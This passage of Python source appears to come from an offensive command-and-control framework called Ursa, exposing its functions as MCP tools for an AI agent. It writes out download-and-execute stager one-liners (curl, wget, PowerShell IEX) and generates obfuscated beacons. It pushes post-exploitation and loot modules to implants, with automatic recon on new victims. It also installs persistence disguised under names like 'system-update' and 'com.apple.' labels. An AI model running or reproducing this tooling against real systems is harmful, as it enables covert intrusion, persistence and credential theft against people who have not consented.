    if output_format == "oneliner":
        return (
            f"python3 -c \"$(curl -s {resolved_url}/stage)\" "
            f"--server {resolved_url} --interval {interval} --jitter {jitter}"
        )

    if output_format == "stager":
        try:
            return builder.build_stager(resolved_url)
        except FileNotFoundError:
            return "Stager source not found at implants/stager.py"

    # "python" — build from template
    available = builder.list_templates()
    if not available:
        return (
            "No templates found in implants/templates/.\n"
            "Add a .py template file to get started.\n\n"
            "Deploy command (using beacon.py directly):\n"
            f"  python3 implants/beacon.py --server {resolved_url} "
            f"--interval {interval} --jitter {jitter}"
        )

    config = PayloadConfig(
        c2_url=resolved_url,
        interval=interval,
        jitter=jitter,
        template=template,
        obfuscate=obfuscate,
    )
    try:
        source = builder.build(config)
    except FileNotFoundError:
        return (
            f"Template '{template}' not found.\n"
            f"Available templates: {available}\n\n"
            f"Use --template with one of the above names."
        )

    if obfuscate:
        return source  # stub already self-contained; no header

    header = [
        f"# Ursa payload — template: {template}",
        f"# C2: {resolved_url}  interval: {interval}s  jitter: {jitter}",
        "#",
        "# Deploy:",
        f"#   python3 payload.py",
        "#",
        "",
    ]
    return "\n".join(header) + source


@mcp_server.tool()
def ursa_stager(c2_url: str | None = None) -> str:
    """
    Generate stager one-liners for different platforms.

    The stager downloads and runs the full beacon from the C2 /stage endpoint.

    Args:
        c2_url: C2 server URL. Auto-detects if not set.
    """
    if not c2_url:
        import socket as _s
        try:
            _sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            _sock.connect(("8.8.8.8", 80))
            local_ip = _sock.getsockname()[0]
            _sock.close()
        except Exception:
            local_ip = "YOUR_IP"
        c2_url = f"http://{local_ip}:6708"

    lines = [
        f"URSA STAGER ONE-LINERS → {c2_url}",
        "",
        "[Python — cross-platform]",
        f"python3 -c \"import urllib.request,os,tempfile,subprocess;"
        f"d=urllib.request.urlopen('{c2_url}/stage').read();"
        f"f=tempfile.NamedTemporaryFile(suffix='.py',delete=False);"
        f"f.write(d);f.close();"
        f"subprocess.Popen(['python3',f.name,'--server','{c2_url}'])\"",
        "",
        "[Bash + curl]",
        f"curl -s {c2_url}/stage -o /tmp/.u.py && python3 /tmp/.u.py --server {c2_url} &",
        "",
        "[PowerShell]",
        f"powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('{c2_url}/stage')\"",
        "",
        "[wget]",
        f"wget -qO /tmp/.u.py {c2_url}/stage && python3 /tmp/.u.py --server {c2_url} &",
        "",
        "NOTE: Ensure the C2 server is running (ursa_start_c2) before deploying.",
    ]

    return "\n".join(lines)


@mcp_server.tool()
def ursa_post_list() -> str:
    """
    List all available post-exploitation modules.

    Returns a table showing each module's name, description, supported
    platforms, and whether it is implemented or still a stub.
    """
    from post.loader import PostLoader as _PostLoader

    modules = _PostLoader().list_modules()
    if not modules:
        return "No post-exploitation modules found."

    lines = ["POST-EXPLOITATION MODULES", "=" * 60, ""]
    for m in modules:
        status = "READY" if m["implemented"] else "stub "
        platforms = ",".join(m["platform"])
        lines.append(f"[{status}]  {m['name']:<28}  [{platforms}]")
        lines.append(f"         {m['description']}")
        lines.append("")

    lines += [
        "=" * 60,
        f"Total: {len(modules)}  "
        f"({sum(1 for m in modules if m['implemented'])} implemented, "
        f"{sum(1 for m in modules if not m['implemented'])} stubs)",
        "",
        "Run a module:  ursa_post_run(module='enum/privesc')",
    ]
    return "\n".join(lines)


@mcp_server.tool()
def ursa_post_run(module: str, args: dict | None = None) -> str:
    """
    Run a post-exploitation module locally (on the C2 machine).

    Implemented modules perform read-only enumeration of the local system.
    Stub modules return an error with implementation instructions.

    Modules that run locally are most useful when the C2 is deployed on the
    target network.  To run against a remote implant session, send the
    module's shell commands as a 'shell' task via ursa_shell().

    Args:
        module: Module name, e.g. 'enum/privesc', 'enum/sysinfo'.
                Use ursa_post_list() to see all available modules.
        args:   Optional dict of module-specific arguments.
    """
    import json

    from post.loader import PostLoader as _PostLoader

    result = _PostLoader().dispatch(module, args or {})

    if not result["ok"]:
        return f"[ERROR] {result['error']}"

    output_parts = [f"[{module}]  ok=True", ""]
    if result["output"]:
        output_parts.append(result["output"])
    if result["data"]:
        output_parts += ["", "--- structured data ---",
                         json.dumps(result["data"], indent=2, default=str)]

    return "\n".join(output_parts)


def _bundle_module(module_name: str) -> str:
    """Bundle post/base.py + the named module into a self-contained exec string.

    Strips post.* imports so the result can be exec()'d on a target that has
    no 'post' package installed.  Returns the combined Python source.
    """
    import re as _re

    root = Path(__file__).parent

    # Read the base module (defines ModuleResult + PostModule)
    base_src = (root / "post" / "base.py").read_text()

    # Stub the @register decorator — not needed on the target
    register_stub = "\n# loader stub\ndef register(cls):\n    return cls\n\n"

    # Resolve module file: "enum/sysinfo" → post/enum/sysinfo.py
    rel_parts = module_name.split("/")
    module_file = root.joinpath("post", *rel_parts).with_suffix(".py")
    if not module_file.exists():
        raise FileNotFoundError(f"Module not found: {module_file}")
    module_src = module_file.read_text()

    # Strip imports that reference post.* (now inlined above)
    for pat in (
        r"^from __future__ import annotations\n",
        r"^from post\.base import [^\n]+\n",
        r"^from post\.loader import [^\n]+\n",
    ):
        module_src = _re.sub(pat, "", module_src, flags=_re.MULTILINE)

    return base_src + register_stub + module_src


@mcp_server.tool()
def ursa_post_dispatch(session_id: str, module: str, args: dict | None = None) -> str:
    """
    Run a post-exploitation module on a live implant session.

    Bundles the module code and queues a 'post' task. The beacon exec()'s the
    code on the target and returns structured output. Use ursa_task_result to
    retrieve the result after the beacon checks in.

    Unlike ursa_post_run (which runs locally on the C2), this sends the module
    to the remote implant.

    Args:
        session_id: Target session ID
        module:     Module name, e.g. 'enum/sysinfo', 'persist/cron'.
                    Use ursa_post_list() to see all available modules.
        args:       Optional dict of module-specific arguments.
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."
    if s["status"] == "dead":
        return f"Session {session_id} is dead. Cannot issue tasks."

    try:
        bundled_src = _bundle_module(module)
    except FileNotFoundError as exc:
        return f"[ERROR] {exc}"

    code_b64 = base64.b64encode(bundled_src.encode()).decode()

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="post",
        args={"code": code_b64, "module": module, "args": args or {}},
        actor="mcp:ursa_post_dispatch",
    )
    if decision["status"] == "approval_required":
        return (
            f"Post dispatch requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"{decision['message']}"
        )
    if decision["status"] != "queued":
        return f"Post dispatch denied: {decision['message']}"

    task_id = decision["task_id"]
    return (
        f"Post task queued: {task_id}\n"
        f"Target:  {s['username']}@{s['hostname']}\n"
        f"Module:  {module}\n"
        f"Args:    {args or {}}\n"
        f"Will execute on next beacon (interval: {s['beacon_interval']}s)\n"
        f"Use ursa_task_result('{task_id}') to retrieve output."
    )


_AUTO_RECON_DEFAULT_MODULES = [
    "enum/sysinfo", "enum/users", "enum/privesc", "enum/network", "enum/loot",
]


@mcp_server.tool()
def ursa_auto_recon_status() -> str:
    """Show the current auto-recon configuration.

    Auto-recon automatically queues a standard initial recon sequence
    (enum/sysinfo → users → privesc → network → loot) when a new implant
    registers with the C2, giving you a full situational picture without
    any manual steps.
    """
    from major.config import get_config as _get_cfg

    cfg_enabled = bool(_get_cfg().get("major.auto_recon.enabled", False))
    cfg_modules = list(_get_cfg().get("major.auto_recon.modules", _AUTO_RECON_DEFAULT_MODULES))

    rt_enabled = get_setting("auto_recon.enabled")
    rt_modules  = get_setting("auto_recon.modules")

    effective_enabled = rt_enabled if rt_enabled is not None else cfg_enabled
    effective_modules = rt_modules  if rt_modules  is not None else cfg_modules

    lines = [
        "── Auto-Recon Status ──────────────────────────────",
        f"  Enabled (effective): {'YES ✓' if effective_enabled else 'NO'}",
        f"  Enabled (config):    {'yes' if cfg_enabled else 'no'}",
        f"  Enabled (runtime):   {'yes' if rt_enabled else 'no'  if rt_enabled is not None else '(not set)'}",
        "",
        "  Modules (effective):",
    ]
    for m in effective_modules:
        lines.append(f"    • {m}")
    if rt_modules is not None and rt_modules != cfg_modules:
        lines += ["", "  Note: runtime module list overrides ursa.yaml"]
    return "\n".join(lines)


@mcp_server.tool()
def ursa_auto_recon_enable(
    modules: list[str] | None = None,
) -> str:
    """Enable auto-recon for new implant sessions.

    When enabled, the C2 automatically queues an initial recon sequence
    (enum/sysinfo → users → privesc → network → loot) the moment a new
    beacon registers, so you get a full situational picture without any
    manual steps.

    This setting takes effect immediately for all new sessions and persists
    across C2 server restarts via the DB.

    Args:
        modules: Optional list of post modules to run in order.
                 Defaults to [enum/sysinfo, enum/users, enum/privesc,
                 enum/network, enum/loot].
    """
    effective_modules = modules if modules else _AUTO_RECON_DEFAULT_MODULES
    set_setting("auto_recon.enabled", True)
    set_setting("auto_recon.modules", effective_modules)
    lines = [
        "Auto-recon ENABLED.",
        "New sessions will automatically receive:",
    ]
    for i, m in enumerate(effective_modules):
        lines.append(f"  {i + 1}. {m}")
    lines.append("\nUse ursa_auto_recon_disable() to turn off.")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_auto_recon_disable() -> str:
    """Disable auto-recon for new implant sessions.

    New beacons will register normally without any automatic task queuing.
    Use ursa_auto_recon_enable() to turn it back on.
    """
    set_setting("auto_recon.enabled", False)
    return (
        "Auto-recon DISABLED.\n"
        "New sessions will register without automatic recon tasks.\n"
        "Use ursa_auto_recon_enable() to re-enable."
    )


# ── Recon helpers ─────────────────────────────────────────────────────────────

_SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
_SEV_ICONS      = {"CRITICAL": "✦", "HIGH": "▲", "MEDIUM": "●", "LOW": "·"}
_LOOT_MODULES   = {"enum/loot", "cred/loot"}


def _parse_post_result(result_str: str) -> tuple[str, dict]:
    """Split a beacon post-task result into (output_text, data_dict)."""
    sentinel = "\n\n--- data ---\n"
    if sentinel in result_str:
        output, data_json = result_str.split(sentinel, 1)
        try:
            return output, json.loads(data_json)
        except (json.JSONDecodeError, ValueError):
            return output, {}
    return result_str, {}


def _collect_findings(tasks: list) -> list[dict]:
    """Extract structured findings from all completed loot post-tasks."""
    all_findings: list[dict] = []
    for t in tasks:
        if t.get("task_type") != "post" or t.get("status") != "completed":
            continue
        args = json.loads(t["args"]) if isinstance(t["args"], str) else (t["args"] or {})
        module = args.get("module", "")
        if module not in _LOOT_MODULES:
            continue
        _, data = _parse_post_result(t.get("result") or "")
        for f in data.get("findings", []):
            all_findings.append({**f, "_module": module, "_task_id": t["id"]})
    return sorted(all_findings, key=lambda f: _SEVERITY_ORDER.get(f.get("severity", "LOW"), 3))


@mcp_server.tool()
def ursa_session_recon(session_id: str) -> str:
    """Show the structured recon findings for a session.

    Parses all completed auto-recon post-task results for the session and
    renders a prioritised findings report (CRITICAL → HIGH → MEDIUM → LOW)
    plus a per-module status table.

    Works best after auto-recon tasks have completed, but shows pending /
    in-progress status if they haven't yet.

    Args:
        session_id: Target session ID.
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    all_tasks = [t for t in list_tasks(session_id=session_id, limit=200)
                 if t.get("task_type") == "post"]
    # Sort ascending (oldest first) for status table
    all_tasks_asc = sorted(all_tasks, key=lambda t: t.get("created_at") or 0)

    header = (
        f"── Recon Report: {session_id} "
        f"({s.get('username', '?')}@{s.get('hostname', '?')} · "
        f"{s.get('os', '?')}) ──"
    )

    # ── Module status table ──
    status_lines = ["", "Module Status:"]
    status_icons = {"pending": "⏳", "in_progress": "⟳", "completed": "✓", "error": "✗"}
    for t in all_tasks_asc:
        args = json.loads(t["args"]) if isinstance(t["args"], str) else (t["args"] or {})
        module  = args.get("module", t.get("task_type", "?"))
        status  = t.get("status", "?")
        icon    = status_icons.get(status, "?")
        age     = _time_ago(t.get("completed_at") or t.get("picked_up_at") or t.get("created_at"))
        # For completed non-loot modules, show a one-liner from output
        snippet = ""
        if status == "completed" and module not in _LOOT_MODULES:
            result_text, _ = _parse_post_result(t.get("result") or "")
            first = next((ln.strip() for ln in result_text.splitlines() if ln.strip()), "")
            snippet = f"  → {first[:80]}" if first else ""
        elif status == "error":
            snippet = f"  → {(t.get('error') or '')[:60]}"
        status_lines.append(f"  {icon} {module:<25} {status:<12} {age}{snippet}")

    # ── Findings from loot modules ──
    findings = _collect_findings(all_tasks)

    if not findings:
        # Check if any loot tasks are still pending/in-progress
        loot_pending = [t for t in all_tasks
                        if (json.loads(t["args"]) if isinstance(t["args"], str) else t.get("args", {}))
                        .get("module") in _LOOT_MODULES
                        and t.get("status") in ("pending", "in_progress")]
        if loot_pending:
            findings_block = "\nFindings: loot modules still running — check back after next beacon check-in."
        elif not any(
            (json.loads(t["args"]) if isinstance(t["args"], str) else t.get("args", {})).get("module") in _LOOT_MODULES
            for t in all_tasks
        ):
            findings_block = "\nFindings: no loot modules in task list. Run ursa_post_dispatch with enum/loot or cred/loot."
        else:
            findings_block = "\nFindings: loot modules completed with no findings."
    else:
        counts = {}
        for f in findings:
            counts[f.get("severity", "?")] = counts.get(f.get("severity", "?"), 0) + 1
        summary = "  ".join(f"{sev}:{n}" for sev, n in
                            sorted(counts.items(), key=lambda x: _SEVERITY_ORDER.get(x[0], 9)))

        finding_lines = [f"\nFindings ({summary}):"]
        cur_sev = None
        for f in findings:
            sev = f.get("severity", "?")
            if sev != cur_sev:
                finding_lines.append(f"\n  {sev}")
                cur_sev = sev
            icon = _SEV_ICONS.get(sev, "·")
            title  = f.get("title", "?")
            detail = f.get("detail", "")
            mod    = f.get("_module", "")
            finding_lines.append(f"  {icon} [{mod}] {title}")
            if detail:
                # Wrap long details
                for chunk in [detail[i:i+90] for i in range(0, min(len(detail), 270), 90)]:
                    finding_lines.append(f"      {chunk}")
        findings_block = "\n".join(finding_lines)

    total = len(all_tasks)
    done  = sum(1 for t in all_tasks if t.get("status") == "completed")
    pending_n = sum(1 for t in all_tasks if t.get("status") == "pending")
    err_n = sum(1 for t in all_tasks if t.get("status") == "error")
    task_summary = f"Post tasks: {total} total | {done} completed"
    if pending_n:
        task_summary += f", {pending_n} pending"
    if err_n:
        task_summary += f", {err_n} errors"

    return "\n".join([header, task_summary] + status_lines) + findings_block


@mcp_server.tool()
def ursa_sitrep() -> str:
    """Operator situation report — full C2 picture in one command.

    Aggregates active sessions, task queue status, recent warnings,
    critical findings from completed recon, and pending approvals.
    Use this as your morning briefing or quick status check.
    """
    now = time.time()
    ts  = datetime.fromtimestamp(now).strftime("%Y-%m-%d %H:%M")

    # ── Sessions ──
    sessions = list_sessions()
    by_status: dict[str, list] = {}
    for s in sessions:
        by_status.setdefault(s.get("status", "?"), []).append(s)
    active  = by_status.get("active",  [])
    stale   = by_status.get("stale",   [])
    dead    = by_status.get("dead",    [])

    # ── Tasks ──
    all_tasks = list_tasks(limit=500)
    task_counts: dict[str, int] = {}
    for t in all_tasks:
        task_counts[t["status"]] = task_counts.get(t["status"], 0) + 1

    # ── Approvals ──
    pending_approvals = list_approval_requests(status="pending", limit=50)

    # ── Recent events (warnings/errors only) ──
    recent_events = [
        e for e in get_events(limit=50)
        if e.get("level") in ("warning", "error")
        and (now - (e.get("timestamp") or 0)) < 3600
    ]

    # ── New sessions (last 24h) with recon status ──
    recent_sessions = [s for s in sessions
                       if (now - (s.get("first_seen") or 0)) < 86400]

    # ── Critical/High findings from loot modules across all sessions ──
    critical_findings: list[dict] = []
    if active or stale:
        # Only scan sessions with recent activity to keep things snappy
        scan_sessions = (active + stale)[:20]
        for s in scan_sessions:
            sid = s["id"]
            s_tasks = [t for t in all_tasks
                       if t.get("session_id") == sid and t.get("task_type") == "post"]
            for f in _collect_findings(s_tasks):
                if f.get("severity") in ("CRITICAL", "HIGH"):
                    critical_findings.append({
                        **f,
                        "_session_id": sid,
                        "_host": f"{s.get('username','?')}@{s.get('hostname','?')}",
                    })

    # ── Auto-recon status ──
    rt_enabled = get_setting("auto_recon.enabled")
    from major.config import get_config as _gcc
    cfg_enabled = bool(_gcc().get("major.auto_recon.enabled", False))
    ar_enabled  = rt_enabled if rt_enabled is not None else cfg_enabled
    ar_modules  = get_setting("auto_recon.modules") or _AUTO_RECON_DEFAULT_MODULES

    # ── Build output ──
    lines: list[str] = [
        f"── Ursa Sitrep ─────────────────────── {ts} ──",
        "",
    ]

    # Sessions summary
    lines += [
        f"  Sessions   {len(active)} active  {len(stale)} stale  {len(dead)} dead",
        f"  Tasks      "
        + "  ".join(f"{k}:{v}" for k, v in sorted(task_counts.items())),
        f"  Approvals  {len(pending_approvals)} pending",
        f"  Alerts     {len(recent_events)} warn/error in last hour",
    ]

    # Active sessions
    if active:
        lines += ["", "Active Sessions:"]
        for s in active[:10]:
            sid      = s["id"]
            host     = f"{s.get('username','?')}@{s.get('hostname','?')}"
            os_info  = (s.get("os") or "")[:18]
            age      = _time_ago(s.get("last_seen"))
            # Recon progress
            s_tasks  = [t for t in all_tasks
                        if t.get("session_id") == sid and t.get("task_type") == "post"]
            done_n   = sum(1 for t in s_tasks if t.get("status") == "completed")
            total_n  = len(s_tasks)
            recon    = f"recon:{done_n}/{total_n}" if total_n else "recon:none"
            lines.append(f"  {sid}  {host:<28} {os_info:<18} {age:<10} [{recon}]")
        if len(active) > 10:
            lines.append(f"  … and {len(active) - 10} more")

    # Stale sessions
    if stale:
        lines += ["", f"Stale Sessions ({len(stale)}):"]
        for s in stale[:5]:
            lines.append(
                f"  {s['id']}  {s.get('username','?')}@{s.get('hostname','?')}  "
                f"last seen {_time_ago(s.get('last_seen'))}"
            )

    # Critical findings
    if critical_findings:
        lines += ["", "⚠ Critical/High Findings:"]
        for f in critical_findings[:15]:
            sev  = f.get("severity", "?")
            icon = _SEV_ICONS.get(sev, "·")
            lines.append(
                f"  {icon} {f['_session_id']} ({f['_host']})  "
                f"[{sev}] {f.get('title','?')}"
            )
        if len(critical_findings) > 15:
            lines.append(f"  … and {len(critical_findings)-15} more. Use ursa_session_recon() for full details.")
    else:
        lines += ["", "  No critical/high findings from completed recon."]

    # Pending approvals
    if pending_approvals:
        lines += ["", f"Pending Approvals ({len(pending_approvals)}):"]
        for a in pending_approvals[:5]:
            lines.append(
                f"  {a['id']}  [{a.get('risk_level','?').upper()}]  "
                f"{a.get('action','?')[:60]}  "
                f"by {a.get('requested_by','?')}"
            )
        if len(pending_approvals) > 5:
            lines.append(f"  … and {len(pending_approvals)-5} more. Use ursa_approvals() to manage.")

    # Auto-recon
    lines += [
        "",
        f"Auto-Recon: {'ENABLED' if ar_enabled else 'DISABLED'}",
    ]
    if ar_enabled:
        lines.append(f"  Modules: {' → '.join(ar_modules)}")

    # New sessions (last 24h) that aren't in active list
    if recent_sessions:
        new_not_shown = [s for s in recent_sessions
                         if s.get("status") != "active" or s not in active]
        if new_not_shown:
            lines += ["", f"New Sessions (last 24h, not active): {len(new_not_shown)}"]

    lines.append("")
    return "\n".join(lines)


def _default_payload_path(os_info: str, implant_type: str = "python") -> str:
    """Pick a low-profile default drop path based on the target OS and implant type."""
    os_lower = os_info.lower()
    if implant_type == "go":
        if os_lower.startswith("windows"):
            return r"%APPDATA%\Microsoft\Windows\update.exe"
        if os_lower.startswith("darwin"):
            return "~/Library/Application Support/.cache_upd"
        return "~/.local/share/.cache_upd"
    # python
    if os_lower.startswith("windows"):
        return r"%APPDATA%\Microsoft\Windows\update.py"
    if os_lower.startswith("darwin"):
        return "~/Library/Application Support/.update.py"
    return "~/.local/share/.update.py"


def _go_goos_goarch(session: dict) -> tuple[str, str]:
    """Map session OS/arch strings to Go GOOS/GOARCH values."""
    os_lower = session.get("os", "").lower()
    arch_lower = session.get("arch", "").lower()

    if os_lower.startswith("darwin"):
        goos = "darwin"
    elif os_lower.startswith("windows"):
        goos = "windows"
    else:
        goos = "linux"

    arch_map = {
        "x86_64": "amd64",
        "amd64":  "amd64",
        "arm64":  "arm64",
        "aarch64": "arm64",
        "i386":   "386",
        "i686":   "386",
        "arm":    "arm",
    }
    goarch = arch_map.get(arch_lower, "amd64")
    return goos, goarch


def _compile_go_beacon(
    c2_url: str, interval: int, jitter: float, goos: str, goarch: str
) -> bytes:
    """Cross-compile the Go beacon for the target platform and return binary bytes.

    Raises RuntimeError if the compiler is unavailable or compilation fails.
    """
    import shutil
    import tempfile

    if not shutil.which("go"):
        raise RuntimeError(
            "Go compiler not found on this machine. "
            "Install Go (https://go.dev/dl/) to use implant_type='go'."
        )

    cfg = PayloadConfig(
        c2_url=c2_url,
        interval=interval,
        jitter=jitter,
        template="http_go",
    )
    try:
        src = _PayloadBuilder().build(cfg)
    except FileNotFoundError as exc:
        raise RuntimeError(f"http_go template not found: {exc}") from exc

    with tempfile.TemporaryDirectory() as tmp:
        src_path = Path(tmp) / "beacon.go"
        src_path.write_text(src, encoding="utf-8")
        ext = ".exe" if goos == "windows" else ""
        bin_path = Path(tmp) / f"beacon{ext}"

        env = {**os.environ, "GOOS": goos, "GOARCH": goarch, "CGO_ENABLED": "0"}
        result = subprocess.run(
            ["go", "build", "-o", str(bin_path), str(src_path)],
            capture_output=True, text=True, env=env,
        )
        if result.returncode != 0:
            raise RuntimeError(
                f"go build failed (GOOS={goos} GOARCH={goarch}):\n{result.stderr}"
            )
        return bin_path.read_bytes()


def _default_method(os_info: str) -> str:
    """Pick the best persistence method for the target OS."""
    os_lower = os_info.lower()
    if os_lower.startswith("darwin"):
        return "launchagent"
    return "cron"  # works on Linux and macOS


@mcp_server.tool()
def ursa_install_persistence(
    session_id: str,
    method: str = "",
    payload_path: str = "",
    c2_url: str | None = None,
    schedule: str = "@reboot",
    label: str = "system-update",
    interval: int = 60,
    jitter: float = 0.3,
    implant_type: str = "python",
) -> str:
    """
    Install a persistent beacon on a live implant session.

    For Python implants, queues two tasks in order:
      1. upload   — drops the generated Python beacon onto the target
      2. post     — installs the chosen persistence mechanism

    For Go implants, queues three tasks in order:
      1. upload   — drops the cross-compiled binary onto the target
      2. shell    — chmod +x <path>  (Unix only)
      3. post     — installs the chosen persistence mechanism

    Args:
        session_id:    Target session ID.
        implant_type:  "python" (default) or "go".
                         python — Python source file, requires python3 on target.
                         go     — Compiled binary, zero runtime dependencies.
                                  Go compiler must be installed on the C2 machine.
                                  Cross-compiled automatically for the target OS/arch.
        method:        Persistence method — "cron", "systemd", or "launchagent".
                       Auto-selects based on target OS if not specified.
                         cron        — user crontab (Linux + macOS, no root)
                         systemd     — user systemd service (Linux only, no root)
                         launchagent — ~/Library/LaunchAgents plist (macOS only)
        payload_path:  Path to drop the beacon on the target.
                       Auto-selected based on OS + implant_type if not specified.
        c2_url:        C2 URL to embed in the beacon.
                       Auto-detects from local IP if not specified.
        schedule:      Cron schedule expression (cron/launchagent methods only).
                       Default: "@reboot". Examples: "*/15 * * * *", "0 * * * *".
        label:         Service/job name for the persistence entry.
                       Default: "system-update".
        interval:      Beacon check-in interval in seconds (default 60).
        jitter:        Jitter factor 0.0-1.0 (default 0.3).
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."
    if s["status"] == "dead":
        return f"Session {session_id} is dead. Cannot install persistence."

    if implant_type not in ("python", "go"):
        return f"Unknown implant_type '{implant_type}'. Use 'python' or 'go'."

    os_info = s.get("os", "")
    resolved_url = c2_url or auto_c2_url()
    resolved_path = payload_path or _default_payload_path(os_info, implant_type)
    resolved_method = method or _default_method(os_info)

    valid_methods = ("cron", "systemd", "launchagent")
    if resolved_method not in valid_methods:
        return (
            f"Unknown method '{resolved_method}'. "
            f"Valid methods: {', '.join(valid_methods)}"
        )

    # ── Generate / compile the beacon payload ─────────────────────────────────
    if implant_type == "go":
        goos, goarch = _go_goos_goarch(s)
        try:
            beacon_bytes = _compile_go_beacon(resolved_url, interval, jitter, goos, goarch)
        except RuntimeError as exc:
            return f"[ERROR] Go compilation failed: {exc}"
        beacon_b64 = base64.b64encode(beacon_bytes).decode()
        beacon_size = len(beacon_bytes)
    else:
        cfg = PayloadConfig(
            c2_url=resolved_url, interval=interval, jitter=jitter, template="http_python",
        )
        try:
            beacon_src = _PayloadBuilder().build(cfg)
        except FileNotFoundError as exc:
            return f"[ERROR] Could not generate beacon: {exc}"
        beacon_b64 = base64.b64encode(beacon_src.encode()).decode()
        beacon_size = len(beacon_src)

    # ── Task 1: upload the beacon ─────────────────────────────────────────────
    upload_decision = queue_task_with_policy(
        session_id=session_id,
        task_type="upload",
        args={"path": resolved_path, "data": beacon_b64},
        actor="mcp:ursa_install_persistence",
    )
    if upload_decision["status"] == "approval_required":
        return (
            f"Persistence install requires approval ({upload_decision['risk_level']} risk).\n"
            f"Approval ID: {upload_decision['approval_id']}\n"
            f"{upload_decision['message']}"
        )
    if upload_decision["status"] != "queued":
        return f"Upload task denied: {upload_decision['message']}"
    upload_task_id = upload_decision["task_id"]

    # ── Task 2 (Go only): chmod +x on Unix targets ────────────────────────────
    chmod_task_id: str | None = None
    if implant_type == "go" and not os_info.lower().startswith("windows"):
        chmod_decision = queue_task_with_policy(
            session_id=session_id,
            task_type="shell",
            args={"command": f"chmod +x {resolved_path}"},
            actor="mcp:ursa_install_persistence",
        )
        if chmod_decision["status"] == "queued":
            chmod_task_id = chmod_decision["task_id"]

    # ── Task 3 (Task 2 for Python): install the persistence entry ─────────────
    persist_module, persist_args = _build_persist_args(
        resolved_method, resolved_path, schedule, label, implant_type,
    )
    try:
        bundled_src = _bundle_module(persist_module)
    except FileNotFoundError as exc:
        return f"[ERROR] Persist module not found: {exc}"

    code_b64 = base64.b64encode(bundled_src.encode()).decode()
    persist_decision = queue_task_with_policy(
        session_id=session_id,
        task_type="post",
        args={"code": code_b64, "module": persist_module, "args": persist_args},
        actor="mcp:ursa_install_persistence",
    )
    if persist_decision["status"] not in ("queued", "approval_required"):
        return f"Persist task denied: {persist_decision['message']}"
    persist_task_id = persist_decision.get("task_id", persist_decision.get("approval_id"))

    # ── Summary ───────────────────────────────────────────────────────────────
    task_lines = [f"  [1] upload  → {upload_task_id}  (drop {implant_type} beacon, {beacon_size:,} bytes)"]
    result_ids = [upload_task_id]
    step = 2
    if chmod_task_id:
        task_lines.append(f"  [{step}] shell   → {chmod_task_id}  (chmod +x {resolved_path})")
        result_ids.append(chmod_task_id)
        step += 1
    task_lines.append(f"  [{step}] post    → {persist_task_id}  (install {resolved_method} entry)")
    result_ids.append(persist_task_id)

    go_info = ""
    if implant_type == "go":
        goos, goarch = _go_goos_goarch(s)
        go_info = f"Compiled for:  {goos}/{goarch}  ({beacon_size:,} bytes)\n"

    return (
        f"Persistence install queued for {s['username']}@{s['hostname']}\n"
        f"\n"
        f"Implant:      {implant_type}\n"
        f"{go_info}"
        f"Method:       {resolved_method}\n"
        f"Drop path:    {resolved_path}\n"
        f"C2 URL:       {resolved_url}\n"
        f"Schedule:     {schedule}\n"
        f"Label:        {label}\n"
        f"\n"
        f"Tasks queued (execute in order on next check-in):\n"
        + "\n".join(task_lines) +
        f"\n\nCheck results with:\n"
        + "\n".join(f"  ursa_task_result('{tid}')" for tid in result_ids)
    )


def _build_persist_args(
    method: str, payload_path: str, schedule: str, label: str,
    implant_type: str = "python",
) -> tuple[str, dict]:
    """Return (module_name, args_dict) for the given persistence method."""
    # Go binary is self-contained; Python needs an interpreter prefix
    cmd = payload_path if implant_type == "go" else f"python3 {payload_path}"
    if method == "cron":
        return "persist/cron", {
            "action": "install",
            "schedule": schedule,
            "command": cmd,
            "label": label,
        }
    if method == "systemd":
        return "persist/cron", {
            "action": "systemd_install",
            "name": label,
            "command": cmd,
            "description": "System Update Agent",
        }
    if method == "launchagent":
        return "persist/launchagent", {
            "action": "install",
            "label": f"com.apple.{label}",
            "command": cmd,
        }
    # Fallback (shouldn't reach here after validation)
    return "persist/cron", {"action": "install", "schedule": schedule,
                            "command": cmd, "label": label}


@mcp_server.tool()
def ursa_traffic_profiles() -> str:
    """
    List available traffic profiles for the C2 server.

    Traffic profiles control how C2 HTTP traffic looks on the wire:
    which URL paths implants beacon to, what Server/response headers
    are returned, and (optionally) what User-Agent implants must send.

    Active profile is set via  major.traffic_profile  in ursa.yaml,
    or with  --traffic-profile  when starting the C2 server.
    """
    try:
        from major.profiles import list_profiles, get_profile, PROFILES

        profiles = list_profiles()
        lines = [
            "Available C2 Traffic Profiles",
            "=" * 45,
        ]
        for p in profiles:
            lines.append(f"\n  {p['name']}")
            lines.append(f"    {p['description']}")
            lines.append(f"    Server header: {p['server_header']}")
            lines.append(f"    Endpoints: {p['endpoints']}")

            # Show URL mappings
            full = get_profile(p["name"])
            for logical, path in full.urls.items():
                lines.append(f"      {logical:10s} → {path}")

            # Show extra response headers
            if full.response_headers:
                lines.append("    Response headers:")
                for k, v in full.response_headers.items():
                    lines.append(f"      {k}: {v}")

        lines += [
            "",
            "To activate a profile:",
            "  1. Set in ursa.yaml:  major.traffic_profile: jquery",
            "  2. Restart C2:        ursa_stop_c2() then ursa_start_c2()",
            "",
            "Note: Implants must be rebuilt with the matching profile paths.",
            "Use the builder extra_tokens from profile.builder_tokens().",
        ]

        return "\n".join(lines)

    except Exception as e:
        return f"Error listing profiles: {e}"


# ── Scan Result Persistence ───────────────────────────────────────────────────


@mcp_server.tool()
def ursa_results_list(
    tool_filter: str | None = None,
    target_filter: str | None = None,
    hours: float | None = None,
    limit: int = 50,
) -> str:
    """List saved scan results from Ursa Minor recon tools.

    All Ursa Minor tools (scan_ports, discover_network, vuln_scan, etc.)
    automatically save their output.  Use this to browse saved results,
    then fetch full output with ursa_results_get or export with
    ursa_results_export.

    Args:
        tool_filter: Filter by tool name substring (e.g. "scan_ports").
        target_filter: Filter by target IP/host substring.
        hours: Only return results from the last N hours.
        limit: Max results to return (default 50).
    """
    from ursa_minor.results import list_results

    since: float | None = None
    if hours is not None:
        import time
        since = time.time() - hours * 3600

    results = list_results(
        tool_filter=tool_filter,
        target_filter=target_filter,
        since=since,
        limit=limit,
    )

